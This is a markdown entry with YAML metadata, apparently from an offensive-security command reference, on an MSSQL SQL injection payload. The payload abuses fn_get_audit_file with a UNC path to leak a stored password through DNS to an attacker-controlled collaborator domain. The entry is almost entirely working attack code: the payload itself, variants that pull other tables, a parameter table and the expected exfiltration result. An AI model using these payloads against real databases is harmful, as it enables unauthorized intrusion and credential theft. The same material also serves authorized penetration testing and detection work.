---
id: 09211511-5d2e-45d0-bc76-4c8d3145e323
name: mssql-check-fn-get-audit-file-access
type: command
executor: sql
data: >-
  1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select
  pass from users where id=1) + '.xxxx.burpcollaborator.net\',default,default)))
output: null
created_at: '2023-04-06T03:56:34.004269+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
platforms:
  - Windows
  - Database
tags:
  - mssql
  - dns-exfiltration
  - sql-injection
verified: true
validated: true
---

# mssql-check-fn-get-audit-file-access

## Command

```sql
1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\',default,default)))
```

## Description

This SQL command checks if the fn_get_audit_file function is accessible, requiring CONTROL SERVER permission. It attempts to read audit files via a UNC path that embeds data from a users table into a DNS query, enabling out-of-band exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `users` | Table name containing sensitive data (e.g., passwords) | Yes |
| `pass` | Column name for exfiltrated data | Yes |
| `id=1` | Row selector for specific record | Yes |
| `xxxx.burpcollaborator.net` | Attacker-controlled DNS collaborator domain | Yes |
| `default` | Default parameters for file path and time | Built-in |

## Examples

### Basic Usage

```sql
1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select pass from users where id=1) + '.attacker-dns.net\',default,default)))
```

### Advanced Usage

Replace the table/column for different data: ```sql
1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select username from accounts where id=1) + '.attacker-dns.net\',default,default)))
```

## Expected Output

If successful (permission granted), the query returns 1, and a DNS resolution occurs to the collaborator domain with the embedded data in the subdomain (e.g., password.attacker-dns.net). If denied, returns 0 or an error, with no DNS query.

## Related

- [[procedures/mssql-out-of-band-dns-exfiltration]]
- [[commands/mssql-check-fn-trace-gettable-access]]
